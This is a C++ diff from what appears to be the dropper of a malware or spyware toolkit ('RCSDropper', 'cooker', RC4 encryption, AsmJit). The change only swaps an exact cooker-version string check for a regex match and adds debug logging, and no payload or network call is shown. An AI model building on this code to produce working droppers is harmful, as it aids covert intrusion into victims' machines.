@@ -12,17 +12,20 @@
 #include <iostream>
 using namespace std;
 
-#include <boost/shared_array.hpp>
-#include <boost/random.hpp>
+#include <boost/algorithm/string.hpp>
 #include <boost/filesystem/fstream.hpp>
 #include <boost/filesystem.hpp>
+#include <boost/format.hpp>
+#include <boost/random.hpp>
+#include <boost/regex.hpp>
+#include <boost/shared_array.hpp>
 
 #include <AsmJit.h>
 
 #include "Common.h"
 #include "DropperHeader.h"
 
-const std::string required_cooker_version = "1.0.3810.22783";
+#include "CookerVersion.h"
 
 static void rc4crypt(
 		const unsigned char *key,
@@ -165,7 +168,7 @@ RCSDropper::RCSDropper(const char* filepath)
 		std::string version = header()->version;
 		if (version.empty())
 			version = "<unknown>";
-		throw InvalidCookerVersion(version, required_cooker_version);
+		throw InvalidCookerVersion(version, printable_required_cooker_version);
 	}
 
 	generateKey();
@@ -175,14 +178,26 @@ RCSDropper::RCSDropper(const char* filepath)
 bool RCSDropper::verifyCookerVersion()
 {
 	DropperHeader* h = header();
+	std::string version = h->version;
+	boost::trim_left(version);
+	boost::trim_right(version);
+
+	DBGTRACE("Dropper built with cooker version: ", version, NOTIFY);
+
 	try {
-		std::string version = h->version;
-		if ( version.compare(required_cooker_version) == 0)
+
+		if ( boost::regex_match(version, required_cooker_version) )
 			return true;
+
+	} catch (boost::regex_error& e) {
+		DBGTRACE("Found version: ", h->version, NOTIFY);
+		DBGTRACE("Required cooker version is not a valid regular expression: ", e.what(), NOTIFY);
+		return false;
 	} catch (...) {
 		return false;
 	}
 
+	DBGTRACE("Dropper built with an invalid cooker version, found ", boost::format("%s, required %s") % version % printable_required_cooker_version, NOTIFY);
 	return false;
 }
 
